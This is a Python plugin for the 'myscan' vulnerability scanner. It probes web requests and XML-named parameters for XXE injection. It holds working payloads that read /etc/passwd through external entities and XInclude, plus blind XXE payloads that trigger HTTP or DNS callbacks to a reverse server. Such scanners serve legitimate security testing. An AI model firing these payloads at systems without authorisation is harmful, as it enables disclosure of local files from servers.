#!/usr/bin/env python3
# @Time    : 2020-02-27
# @Author  : caicai
# @File    : myscan_xss.py
'''
refer:https://github.com/JoyChou93/java-sec-code/wiki/XXE
'''

from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse
import re


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "xxe"
        self.vulmsg = "通过外部实体注入"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.argnames=["xml"] #指定参数名测试

    def verify(self):

        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        needtestparams=self.findparams(params)

        self.parser = dictdata_parser(self.dictdata)

        #针对xml数据包
        if self.dictdata.get("request").get("content_type") == 3 :
            body = self.parser.getrequestbody()
            xmlversion = False
            if re.search(b"^\s*<\?xml", body):
                xmlversion = True
            xmlversion_text = '<?xml version="1.0" encoding="UTF-8"?>'


            #show-xxe
            payloads = [
                (
                '''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',
                "root:x:0"),
                (
                '''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',
                "root:x:0")
            ]
            for payload, show in payloads:
                req = self.parser.generaterequest({"data":payload})
                r = request(**req)
                if show in r.text:
                    self.save("in body ,payload:{}".format(payload))

            # bind-xxe
            payloads = [
                '<!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
                '<!DOCTYPE foo SYSTEM "{}">'
            ]
            querys = []
            for payload_ in payloads:
                if not xmlversion:
                    payload_ = xmlversion_text + "\r\n" + payload_
                info = "xxe_" + self.parser.getfilepath()
                for method in ["http", "dns"]:
                    payload = payload_
                    url, hexdata = self.generatepayload(info, method)
                    if not xmlversion:
                        bodywithpayload = (payload.format(url) + "\r\n").encode() + body
                    else:
                        payload = ("\r\n" + payload.format(url)).encode()
                        bodywithpayload = self.parser.addpayloadtobody(body, payload, b"?>")
                    querys.append((hexdata, bodywithpayload))
                    req = self.parser.generaterequest({"data": bodywithpayload})
                    r = request(**req)
            self.querytosave(querys)
        #针对包含特定关键字的参数名
        if needtestparams is not []:
            for param in needtestparams:
                success=False
                #show-xxe
                payloads=[
                    ('''<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>''',"root:x:0"),
                    ('''<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>''',"root:x:0")
                ]
                for payload,show in payloads:
                    req=self.parser.getreqfromparam(param,"w",payload)
                    r=request(**req)
                    if show in r.text:
                        # success=True
                        self.save("param:{} ,payload:{}".format(param.get("name",""),payload))
                if not success:
                    #bind-xxe
                    payloads = [
                        '<!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
                        '<!DOCTYPE uuu SYSTEM "{}">'
                    ]
                    querys = []
                    for payload_ in payloads:
                        info = "xxe_" + self.parser.getfilepath()
                        for method in ["http", "dns"]:
                            url, hexdata = self.generatepayload(info, method)

                            req = self.parser.getreqfromparam(param, "w",payload_.format(url))
                            querys.append((hexdata, "param:{} payload:{}".format(param.get("name",""),payload_.format((url)))))
                            r = request(**req)
                    self.querytosave(querys)


    def generatepayload(self, info, type):
        cmds, hexdata = generate_reverse_payloads(info, type)
        if type == "http":
            url = cmds[0].split(" ", 1)[1]
        else:
            url = "http://" + cmds[0].split(" ")[-1]
        return url, hexdata

    def querytosave(self, querys):
        if querys == []:
            return
        hexdata, bodywithpayload = querys[0]
        res, res_data = query_reverse(hexdata)
        if res:
            self.save(bodywithpayload)
            return
        for hexdata, bodywithpayload in querys[1:]:  # 后面的不睡眠等待
            res, res_data = query_reverse(hexdata, False)
            if res:
                self.save(bodywithpayload)
                break

    def save(self, payload):
        self.result.append({
            "name": self.name,
            "url": self.dictdata.get("url").get("url").split("?")[0],
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "payload": payload,
                "vulmsg": self.vulmsg,
                "request": self.parser.getrequestraw(),
                "response": self.parser.getresponseraw()
            }
        })
    def findparams(self,params):
        needtestparams=[]
        for param in params:
            name=param.get("name","")
            if name is not "":
                for arg in self.argnames:
                    if arg in name:
                        needtestparams.append(param)
        return needtestparams

